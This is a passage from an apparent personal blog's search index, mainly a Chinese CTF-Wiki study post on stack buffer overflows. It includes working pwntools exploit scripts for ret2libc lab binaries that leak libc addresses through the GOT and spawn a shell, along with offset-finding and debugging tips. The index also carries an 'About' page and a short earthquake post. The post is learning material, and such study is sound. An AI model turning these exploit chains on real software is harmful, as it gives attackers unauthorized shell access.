binsh_addr])\rsh.sendline(payload)\rsh.interactive() 这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以\u0026rsquo;bbbb\u0026rsquo; 作为虚假的地址，其后参数对应的参数内容。\n当查找不到\u0026quot;/bin/sh\u0026quot;时，需要我们来自己读取字符串，所以此时需要两个gadget，第一个用来控制程序读取字符串，第二个用来控制程序执行system函数。这种情况的解决办法就是向程序种bss段的buf2处写入字符串，并将其地址作为参数传给system()函数。\nEXP如下：\n##!/usr/bin/env python\rfrom pwn import *\rsh = process(\u0026#39;./ret2libc2\u0026#39;)\rgets_plt = 0x08048460\rsystem_plt = 0x08048490\rpop_ebx = 0x0804843d\rbuf2 = 0x804a080\rpayload = flat([\u0026#39;a\u0026#39; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])\rsh.sendline(payload)\rsh.sendline(\u0026#39;/bin/sh\u0026#39;)\rsh.interactive() 注意payload中的pop_ebx是用来平衡堆栈的。\n同时找不到\u0026quot;/bin/sh\u0026quot;与system()函数地址的情况，用到了两个知识点：\nsystem 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。 即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，而 libc 在 github 上有人进行收集，可以用网站查找，用pwntools中的工具查找。 所以如果采用got表泄露(即输出某个函数对应的 got 表项的内容)的方法，泄露出了libc中某个函数的地址，就能够确定libc的版本号。由于libc的延迟绑定机制，我们需要泄露已经执行过的函数的地址。使用LibcSearcher工具可简化操作流程。\n此外，libc中是一定存在\u0026quot;/bin/sh\u0026quot;的，所以字符串地址也可以获取。这方面工具做的很完善。\n示例：\nint __cdecl main(int argc, const char **argv, const char **envp)\r{\rint v4; // [sp+1Ch] [bp-64h]@1\rsetvbuf(stdout, 0, 2, 0);\rsetvbuf(stdin, 0, 1, 0);\rputs(\u0026#34;No surprise anymore, system disappeard QQ.\u0026#34;);\rprintf(\u0026#34;Can you find it !?\u0026#34;);\rgets((char *)\u0026amp;v4);\rreturn 0;\r} 思路：\n泄露 __libc_start_main 地址 获取 libc 版本 获取 system 地址与 /bin/sh 的地址 再次执行源程序 触发栈溢出执行 system(‘/bin/sh’) EXP如下：\n#!/usr/bin/env python\rfrom pwn import *\r## 导入工具\rfrom LibcSearcher import LibcSearcher\r## 本地连接\rsh = process(\u0026#39;./ret2libc3\u0026#39;)\r## 将文件加载入进程\rret2libc3 = ELF(\u0026#39;./ret2libc3\u0026#39;)\r##简化libc库中函数地址的表示方法\rputs_plt = ret2libc3.plt[\u0026#39;puts\u0026#39;]\rlibc_start_main_got = ret2libc3.got[\u0026#39;__libc_start_main\u0026#39;]\rmain = ret2libc3.symbols[\u0026#39;main\u0026#39;]\r## 监视程序进行到哪一步，提醒自己\rprint \u0026#34;leak libc_start_main_got addr and return to main again\u0026#34;\r## puts函数泄露出start_main函数地址\rpayload = flat([\u0026#39;A\u0026#39; * 112, puts_plt, main, libc_start_main_got])\r## 在输出前面字符串后，将payload输入\rsh.sendlineafter(\u0026#39;Can you find it !?\u0026#39;, payload)\rprint \u0026#34;get the related addr\u0026#34;\r##将接收到的puts函数的输出，经过u32由机器码转换成常见的地址形式\rlibc_start_main_addr = u32(sh.recv()[0:4])\r##通过函数名与函数地址作为参数，用LibcSearcher找到libc版本号。\rlibc = LibcSearcher(\u0026#39;__libc_start_main\u0026#39;, libc_start_main_addr)\r## 泄露出libc中start_main()函数地址，减去相对地址，得基地址。\rlibcbase = libc_start_main_addr - libc.dump(\u0026#39;__libc_start_main\u0026#39;)\r## 已知基地址与相对地址，得到绝对地址\rsystem_addr = libcbase + libc.dump(\u0026#39;system\u0026#39;)\rbinsh_addr = libcbase + libc.dump(\u0026#39;str_bin_sh\u0026#39;)\r## 监视程序进行到哪一步\rprint \u0026#34;get shell\u0026#34;\rpayload = flat([\u0026#39;A\u0026#39; * 104, system_addr, 0xdeadbeef, binsh_addr])\rsh.sendline(payload)\rsh.interactive() 0X05\u0026ndash;稍作总结：\nret2text，ret2shellcode，ret2syscall，ret2libc四种类型，第四种最常用，第一种和第三种感觉有相似之处，第三种比较奇怪，所以用的最少。\n0X06\u0026ndash;MISC:\n1.最简单栈溢出，一套工具解决。\npython pattern.py create 150 gdb X run (input) q(uit) python pattern.py offset (address)\n即可得到溢出地址\n2.注意是返回地址，不是/bin/sh本身在栈上。\n3.再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。（手动观察左上角窗口中的函数名，对main函数和system函数及一些容易造成溢出的函数加以注意。以及题目中可能会有hint和backdoor作为函数名）。\n4.flat中的字符都是一次性发过去的，静态存储，在栈空间有足够长的的地址。\n5.具体的链内部的控制，每次布置好返回地址的实现：可以是一长串字符，主调函数地址+pop ebx（堆栈平衡）+buf+被调函数地址，两次以上的函数调用一定要做到堆栈平衡。最后一个调用的函数一般都是system函数，不需要返回地址作为参数，只需要输入“/bin/sh”的地址作为参数。\n6.r.sendlineuntil(‘AAA’,payload）表示直到返回了AAA字符串进行输入。\n7.p32（），将括号内的数转换为机器码。u32（），将括号内的机器码转化为字符或者数字。\n8.gdb调试寻找字符串命令：find+起始地址+长度+“字符串”,如：find 0xb7e393f0, +2200000, “/bin/sh”。\n9.read函数（），从打开的设备或者文件中读取数据。ssize_t read(int fd, void *buf, size_t count);count是请求读取的字节数，读取的数据保存在缓冲区buf中，同时文件的当前读写位置后移。返回值是成功读取的字节数；write函数，三个参数分别为(int fd，const void *buf，size_t nbyte)分别为文件描述符，指定的缓冲区（指向一段内存单元的指针）和要写入文件的字节数。\n10.GOT定位：对于模块外部引用的全局变量和全局函数，用 GOT 表的表项内容作为地址来间接寻址；对于本模块内的静态变量和静态函数，用 GOT 表的首地址作为一个基准，用相对于该基准的偏移量来引用，因为不论程序被加载到何种地址空间，模块内的静态变量和静态函数与 GOT 的距离是固定的，并且在链接阶段就可知晓其距离的大小。这样，PIC 使用 GOT 来引用变量和函数的绝对地址，把位置独立的引用重定向到绝对位置。 PLT表：过程链接表用于把位置独立的函数调用重定向到绝对位置。通过 PLT 动态链接的程序支持惰性绑定模式。每个动态链接的程序和共享库都有一个 PLT，PLT 表的每一项都是一小段代码，对应于本运行模块要引用的一个全局函数。程序对某个函数的访问都被调整为对 PLT 入口的访问。\n11.内存四区，一个由c/C++编译的程序占用的内存分为以下几个部分： 1.栈区（stack）：由编译器自动分配释放 ，存放函数的参数值，局部变量的值等。其操作方式类似于数据结构中的栈。2.堆区（heap)： 一般由程序员分配释放， 若程序员不释放，程序结束时可能由OS回 收 。注意它与数据结构中的堆是两回事，分配方式倒是类似于链表。3.数据区：主要包括静态全局区和常量区。如果要站在汇编角度细分的话还可以分为很多小的区。全局区（静态区）（static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域， 未初始化的全局变量和未初始化的静态变量在相邻的另一块区域，程序结束后由系统释放。常量区 ：常量字符串就是放在这里的。 程序结束后由系统释放4.代码区：存放函数体的二进制代码。\n12.需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是\n\\x3b\\x84\\x04\\x08 但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \\，x 等也算一个单独的字符。。所以我们需要想办法将 \\x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了。\n13.常见的危险函数如下\n输入 gets，直接读取一行，忽略\u0026rsquo;\\x00' scanf vscanf 输出 sprintf 字符串 strcpy，字符串复制，遇到\u0026rsquo;\\x00\u0026rsquo;停止 strcat，字符串拼接，遇到\u0026rsquo;\\x00\u0026rsquo;停止 bcopy 计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式\n相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得 相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。 直接地址索引，就相当于直接给定了地址。 一般来说，我们会有如下的覆盖需求\n覆盖函数返回地址，这时候就是直接看 EBP 即可。 覆盖栈上某个变量的内容，这时候就需要更加精细的计算了。 覆盖 bss 段某个变量的内容。 根据现实执行情况，覆盖特定的变量或地址的内容。 之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来直接或者间接地控制程序执行流程。\n0X06\u0026ndash;尚存在的问题:\n1.关于ret2shellcode是如何执行的。RWX,bss段具有可执行权限，即NX开没开有什么意义，看不到区别。\n2.ESP的调试为什么断点下在CALL处。\n3.buf两端的问题。\n4.关于shellcode的位置问题：正常情况下都是使用gds调试程序，然后查看内存来确定shellcode的为之。但实际上执行exp的时候会发现shellcode不在这个位置上，因为gdb的调试环境会影响buf在内存中的位置。关闭ALSR只能保证buf的地址在gdb的调试环境中不变，但是直接执行elf时，buf的位置会固定在别的地址上。 解决此问题最简单的方法就是开启core dump功能，即： ulimit -c unlimited sudo sh -c ‘echo “/tmp/core.%t” \u0026gt; /proc/sys/kernel/core_pattern’ 开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。\nCTF-Wiki\u0026gt;Linux Pwn:\nStack Overflow principle\nBasic ROP\n系统调用\nGithub上Libc版本库\nLibcSearcher工具\n现代栈溢出利用技术基础：ROP\n一步一步学ROP之linux_x86篇\n一步一步学ROP之linux_x64篇\n手把手教你栈溢出从入门到放弃（上）\n手把手教你栈溢出从入门到放弃（下）\nLinux下pwn从入门到放弃\n","date":"2019-06-20T00:06:21+08:00","permalink":"https://wander1ng.com/post/ctf-wiki/","section":"post","tags":["技术"],"title":"CTF Wiki"},{"categories":null,"contents":"Cybersecurity Researcher(Focusing on Advanced Persistent Threat)\nInterest: Reading | Photography | Travel | Wander | Cooking\nWeChat ID: WanderingtotheMoon (どうぞよろしくお願いいたします)\n微信公众号：清夜无尘的一方天地 (欢迎关注~)\n[不要温和地走进那个良夜]——Dylan Thomas\n[我与我周旋久 宁作我]——《世说新语》\n[去爱去生活去受伤]——《我的阿勒泰》\n[A rolling stone gathers no moss]——Publiius Syrus\n[湖中焉得更有此人！]——张岱\n[身体为了繁衍留下后代，精神为了繁衍留下文字。]——我自己\n[阅读只是在被动接受，你读过什么并不代表你是什么。书写才能定义自我，你所写下的就是你自己。]——我自己\n[去记录，记录能够对抗生命的流逝。]——我自己\n","date":"2019-06-19T22:02:31+08:00","permalink":"https://wander1ng.com/about/","section":"","tags":["Meta"],"title":"About"},{"categories":null,"contents":"Earthquake and Blog\n第一次建博客的那天晚上，人在学校宿舍，遭遇了人生第一次感到恐慌的地震，震级为6.0级，以至于之后的半年常常在半夜惊醒。\n地震这事，大概就和吃云南野生菌中毒一样，没有必要执着于去经历一次，可是经历过一次真的永生难忘\u0026hellip;\n又想到《西游记》中齐天大圣也是从一块灵石降世，这地震大抵也是我的博客第一声“Hello World\u0026quot;引发的天地异象~\n","date":"2019-06-19T02:56:00+08:00","permalink":"https://wander1ng.com/post/gensis/","section":"post","tags":["Meta"],"title":"Gensis"}]